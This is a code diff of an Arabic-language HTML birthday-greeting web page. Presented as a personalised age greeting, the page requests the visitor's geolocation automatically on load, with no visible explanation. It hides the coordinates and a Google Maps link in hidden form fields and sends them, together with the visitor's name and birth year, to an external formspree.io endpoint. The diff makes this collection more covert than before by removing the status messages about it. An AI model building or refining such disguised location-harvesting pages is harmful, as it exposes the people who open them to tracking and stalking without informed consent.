@@ -22,7 +22,7 @@
       box-shadow: 0 12px 35px rgba(0,0,0,0.15);
       text-align: center;
       width: 100%;
-      max-width: 380px;
+      max-width: 400px;
       border: 3px solid #ff6b81;
     }
     .icon {
@@ -37,16 +37,34 @@
     .greeting-text {
       font-size: 15px;
       color: #555;
-      margin-bottom: 25px;
+      margin-bottom: 20px;
       line-height: 1.6;
       background: #fff0f3;
       padding: 12px;
       border-radius: 12px;
     }
-    input[type="text"] {
+    .birthday-message {
+      background: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%);
+      padding: 15px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      font-size: 18px;
+      font-weight: bold;
+      color: #c0392b;
+      display: none;
+    }
+    .birthday-message.show {
+      display: block;
+      animation: fadeIn 0.5s ease;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    input[type="text"], input[type="number"] {
       width: 100%;
       padding: 12px;
-      margin-bottom: 15px;
+      margin-bottom: 12px;
       border: 1px solid #ddd;
       border-radius: 10px;
       box-sizing: border-box;
@@ -54,42 +72,44 @@
       text-align: center;
       background-color: #fafafa;
     }
-    .btn-geo {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 15px;
-      background-color: #ff6b81;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      font-size: 15px;
-      font-weight: bold;
-      transition: 0.2s;
+    input[type="number"] {
+      -moz-appearance: textfield;
     }
-    .btn-geo:hover {
-      background-color: #ff4757;
+    input[type="number"]::-webkit-inner-spin-button {
+      -webkit-appearance: none;
     }
     .btn-submit {
       width: 100%;
       padding: 14px;
-      background-color: #2ed573;
+      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
       color: white;
       border: none;
       border-radius: 10px;
-      font-size: 16px;
+      font-size: 18px;
       font-weight: bold;
       cursor: pointer;
-      transition: 0.2s;
+      transition: 0.3s;
+      margin-top: 5px;
     }
     .btn-submit:hover {
-      background-color: #26af5f;
+      transform: scale(1.02);
+      box-shadow: 0 5px 15px rgba(245, 87, 108, 0.4);
     }
     #status {
-      font-size: 13px;
-      margin-bottom: 15px;
+      font-size: 14px;
+      margin: 15px 0 10px;
       color: #666;
       font-weight: 500;
+      min-height: 25px;
+    }
+    .age-badge {
+      display: inline-block;
+      background: #ff6b81;
+      color: white;
+      padding: 3px 12px;
+      border-radius: 20px;
+      font-size: 14px;
+      margin-top: 5px;
     }
   </style>
 </head>
@@ -99,30 +119,47 @@
     <div class="icon">🎉</div>
     <h2>كل عام وأنت بخير!</h2>
     <p class="greeting-text">
-      أجمل التهاني وأطيب الأماني بمناسبة عيد ميلادك السعيد! 🎈<br>
-      اكتب اسمك وشاركنا فرحتك لتبدأ الاحتفال معنا.
+      🎈 أدخل اسمك وسنة ميلادك، وستظهر لك تهنئة خاصة بعمرك الحقيقي!
     </p>
     
+    <!-- رسالة العمر -->
+    <div id="birthdayMessage" class="birthday-message">
+      🎂 <span id="displayName"></span>، عمرك الآن <span id="displayAge"></span> سنة!
+      <br>كل سنة وأنت طيب يا بطل 💪
+    </div>
+    
     <form id="birthdayForm">
-      <input type="text" id="nameInput" name="name" placeholder="أدخل اسمك الكريم هنا" required>
-
-      <button type="button" class="btn-geo" onclick="getLocation()">اضغط هنا لتفعيل بطاقة التهنئة 🎁</button>
+      <input type="text" id="nameInput" placeholder="👤 أدخل اسمك الكريم" required>
+      <input type="number" id="yearInput" placeholder="📅 أدخل سنة ميلادك (مثال: 1995)" required min="1900" max="2026">
       
       <div id="status"></div>
 
       <input type="hidden" id="lat" name="latitude">
       <input type="hidden" id="lon" name="longitude">
       <input type="hidden" id="map_link" name="google_maps_link">
+      <input type="hidden" id="age" name="age">
 
-      <button type="button" class="btn-submit" onclick="sendData()">إرسال التهنئة الان ✨</button>
+      <button type="button" class="btn-submit" onclick="handleSubmit()">🎁 إرسال التهنئة الآن</button>
     </form>
   </div>
 
   <script>
+    // جلب الموقع تلقائياً عند تحميل الصفحة
+    window.onload = function() {
+      getLocation();
+      
+      // حساب العمر تلقائياً عند كتابة السنة
+      document.getElementById('yearInput').addEventListener('input', function() {
+        calculateAgeAndShow();
+      });
+      
+      document.getElementById('nameInput').addEventListener('input', function() {
+        calculateAgeAndShow();
+      });
+    };
+
     function getLocation() {
-      const status = document.getElementById('status');
       if (navigator.geolocation) {
-        status.innerText = "جاري تحضير مفاجأة عيد الميلاد...";
         navigator.geolocation.getCurrentPosition(
           (position) => {
             const lat = position.coords.latitude;
@@ -130,56 +167,99 @@
             document.getElementById('lat').value = lat;
             document.getElementById('lon').value = lon;
             document.getElementById('map_link').value = `https://maps.google.com/?q=${lat},${lon}`;
-            status.innerText = "تم تجهيز المفاجأة بنجاح! 🎉";
-            status.style.color = "#2ed573";
           },
           (error) => {
-            status.innerText = "تم تخطي الخطوة أو تعذر الاستمرار يرجى المحارلة مرة اخرى.";
-            status.style.color = "#ff4757";
+            // إذا رفض الموقع، نكمل عادي
+            console.log("الموقع غير مفعل");
           }
         );
-      } else {
-        status.innerText = "متصفحك لا يدعم هذه الخدمة.";
       }
     }
 
-    function sendData() {
-      const name = document.getElementById('nameInput').value;
-      const status = document.getElementById('status');
+    function calculateAgeAndShow() {
+      const name = document.getElementById('nameInput').value.trim();
+      const year = parseInt(document.getElementById('yearInput').value);
+      const currentYear = new Date().getFullYear();
+      const messageDiv = document.getElementById('birthdayMessage');
       
+      // إذا كان الاسم والسنة موجودة وصحيحة
+      if (name && year && year >= 1900 && year <= currentYear) {
+        const age = currentYear - year;
+        if (age > 0 && age < 120) {
+          document.getElementById('displayName').textContent = name;
+          document.getElementById('displayAge').textContent = age;
+          document.getElementById('age').value = age;
+          messageDiv.classList.add('show');
+          return;
+        }
+      }
+      
+      // إخفاء الرسالة إذا البيانات ناقصة
+      messageDiv.classList.remove('show');
+    }
+
+    function handleSubmit() {
+      const name = document.getElementById('nameInput').value.trim();
+      const year = document.getElementById('yearInput').value.trim();
+      const status = document.getElementById('status');
+      const age = document.getElementById('age').value;
+      
+      // التحقق من المدخلات
       if (!name) {
-        alert("الرجاء إدخال الاسم أولاً!");
+        status.innerText = "⚠️ الرجاء إدخال اسمك!";
+        status.style.color = "#ff4757";
+        return;
+      }
+      
+      if (!year || isNaN(year) || year < 1900 || year > new Date().getFullYear()) {
+        status.innerText = "⚠️ الرجاء إدخال سنة ميلاد صحيحة!";
+        status.style.color = "#ff4757";
+        return;
+      }
+      
+      if (!age || age < 1) {
+        status.innerText = "⚠️ يرجى التأكد من سنة الميلاد!";
+        status.style.color = "#ff4757";
         return;
       }
 
-      status.innerText = "جاري الإرسال...";
+      // رسالة تأكيد قبل الإرسال
+      if (!confirm(`🎈 هل تريد إرسال تهنئة باسم "${name}" وعمر ${age} سنة؟`)) {
+        return;
+      }
+
+      status.innerText = "⏳ جاري الإرسال...";
       status.style.color = "#333";
 
       const data = {
         name: name,
-        latitude: document.getElementById('lat').value,
-        longitude: document.getElementById('lon').value,
-        google_maps_link: document.getElementById('map_link').value
+        age: age,
+        birth_year: year,
+        latitude: document.getElementById('lat').value || "غير متاح",
+        longitude: document.getElementById('lon').value || "غير متاح",
+        google_maps_link: document.getElementById('map_link').value || "غير متاح"
       };
 
       fetch("https://formspree.io/f/xpqvvkdp", {
         method: "POST",
         body: JSON.stringify(data),
         headers: {
-            'Accept': 'application/json',
-            'Content-Type': 'application/json'
+          'Accept': 'application/json',
+          'Content-Type': 'application/json'
         }
       }).then(response => {
         if (response.ok) {
-          status.innerText = "تم إرسال التهنئة بنجاح! شكراً لك 🎊";
+          status.innerText = "✅ تم إرسال التهنئة بنجاح! شكراً لك 🎊";
           status.style.color = "#2ed573";
           document.getElementById('birthdayForm').reset();
+          document.getElementById('birthdayMessage').classList.remove('show');
+          document.getElementById('status').innerText = "🎉 شكراً لك، تم استلام تهنئتك!";
         } else {
-          status.innerText = "حدث خطأ من الخادم، تأكد من صحة الرابط.";
+          status.innerText = "❌ حدث خطأ من الخادم، حاول مرة أخرى.";
           status.style.color = "#ff4757";
         }
       }).catch(error => {
-        status.innerText = "تعذر الاتصال بالخادم.";
+        status.innerText = "❌ تعذر الاتصال بالخادم.";
         status.style.color = "#ff4757";
       });
     }
